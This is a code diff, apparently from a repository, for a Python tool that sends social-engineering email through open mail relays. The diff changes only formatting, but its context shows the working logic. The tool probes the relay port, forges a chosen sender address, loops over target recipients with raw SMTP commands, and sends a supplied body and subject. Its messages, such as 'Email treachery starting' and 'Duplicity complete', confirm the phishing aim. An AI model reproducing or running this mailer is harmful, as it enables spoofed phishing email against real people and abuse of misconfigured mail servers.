@@ -36,7 +36,7 @@ _  /_/ /  __/ /_ _  /   / /_/ /_  /_/ // /_/ /_  /
                                /____/               
 Quick fire SE email to an open relay, Version: %s
 
-\x1b[0m""" %__version__
+\x1b[0m""" % __version__
 
 #   oblig program banner
 
@@ -80,7 +80,7 @@ def checkrelay(relay_ip, relay_port):
     chksckt.settimeout(3)
     try:
         chksckt.connect((relay_ip, relay_port))
-        print ("%s{!} Mail relay open! Email treachery starting...%s\n" %(cyan,clear))
+        print ("%s{!} Mail relay open! Email treachery starting...%s\n" % (cyan,clear))
         return True
     except Exception as e:
         sys.exit("%s{-} %d/tcp port closed. Connect failed (%s)%s" % (red,relay_port,e,clear))
@@ -101,11 +101,11 @@ def relay_cmds(source_email, emails, bodyfile, subject):
         betray.send("mail from: " + source_email + "\r\n")
         sleep(sleeptime)
         for i in emails:
-            print ("%s{+} Sending TO %s %s" %(green,i,clear))
+            print ("%s{+} Sending TO %s %s" % (green,i,clear))
             betray.send("rcpt to: " + i + "\r\n")
             sleep(sleeptime)
             if "550" in betray.recv(1024):
-                print ("%s{-} Unable to relay to %s, no such mailbox.%s") %(red,i,clear)
+                print ("%s{-} Unable to relay to %s, no such mailbox.%s") % (red,i,clear)
         betray.send("DATA\r\n")
         sleep(sleeptime)
         betray.send("Subject:" + subject + "\r\n")
@@ -123,7 +123,7 @@ def relay_cmds(source_email, emails, bodyfile, subject):
         sleep(sleeptime)
         betray.close()
     except Exception as e:
-        sys.exit("%s{-} Failed to open socket. (%s)%s" %(red,e,clear))
+        sys.exit("%s{-} Failed to open socket. (%s)%s" % (red,e,clear))
     file.close()
 
 
@@ -158,7 +158,7 @@ def main():
     valid_emails = [email for email in target_email_list if checkmailsyntax(email)]
 #   put any invalid emails into file for cross-checking
     if invalid_emails:
-        print("%s{!} Syntactically invalid emails detected - see output file. Removing...%s" %(cyan, clear))
+        print("%s{!} Syntactically invalid emails detected - see output file. Removing...%s" % (cyan, clear))
         bad_mail=open("invalid_email_output.txt","w")
         for mail in invalid_emails:
             bad_mail.write("%s\n" % mail)
@@ -169,9 +169,9 @@ def main():
             relay_cmds(args.source, valid_emails, args.bodyfile, args.subject)
             print ("\n%s{!} Duplicity complete. Expect good news.%s" % (cyan,clear))
         else:
-            sys.exit("%s{-} teh fail. Quitting.%s" %(red,clear))
+            sys.exit("%s{-} teh fail. Quitting.%s" % (red,clear))
     else:
-        sys.exit("%s{-} Source email has invalid syntax.%s" %(red,clear))
+        sys.exit("%s{-} Source email has invalid syntax.%s" % (red,clear))
 
 
 if __name__=="__main__":
